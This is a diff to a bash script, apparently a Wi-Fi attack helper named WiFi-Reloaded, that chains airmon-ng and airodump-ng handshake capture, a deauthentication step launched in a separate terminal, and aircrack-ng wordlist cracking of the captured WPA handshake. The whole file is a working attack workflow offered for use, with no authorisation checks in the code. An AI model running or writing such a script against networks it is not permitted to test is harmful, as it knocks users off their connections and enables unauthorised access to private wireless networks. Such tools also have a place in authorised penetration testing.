@@ -19,6 +19,7 @@ reset
 airmon-ng
 echo "--------------------------------------------------------------------------------"
 read -p "What Is Your Monitor Interface: " monInterface
+export monInterface
 reset
 echo "Press CTRL-C To Stop"
 echo "3"
@@ -30,10 +31,12 @@ sleep 1
 airodump-ng $monInterface
 echo "--------------------------------------------------------------------------------"
 read -p "What Is The BSSID: " bssid
+export bssid
 echo "--------------------------------------------------------------------------------"
 read -p "What Is The Channel: " channel
 reset
 read -p "Handshake CAP FIle Name: " fop
+mkdir Handshakes/$fop
 reset
 echo "Press CTRL-C To Stop"
 echo "3"
@@ -42,7 +45,23 @@ echo "2"
 sleep 1
 echo "1"
 sleep 1
-airodump-ng -c $channel -w Handshakes/$fop/$fop --bssid $bssid $monInterface
+gnome-terminal -e ./deauth-fa && airodump-ng -c $channel -w Handshakes/$fop/$fop --bssid $bssid $monInterface
 echo "--------------------------------------------------------------------------------"
-echo "Handshake CAP File Saved To: WiFi-Reloaded/Handshakes/$fop/$fop-01.cap"
+reset
+read -p "Wordlist Path: " wordlist
+reset
+cappath="Handshakes/$fop/$fop-01.cap"
+echo "Press CTRL-C To Stop"
+echo "3"
+sleep 1
+echo "2"
+sleep 1
+echo "1"
+sleep 1
+aircrack-ng -w $wordlist $cappath
 echo "--------------------------------------------------------------------------------"
+read -p "Go Back? [yes/no]: " back
+if [ $back == yes ]
+then
+  ./wifi-reloaded
+fi
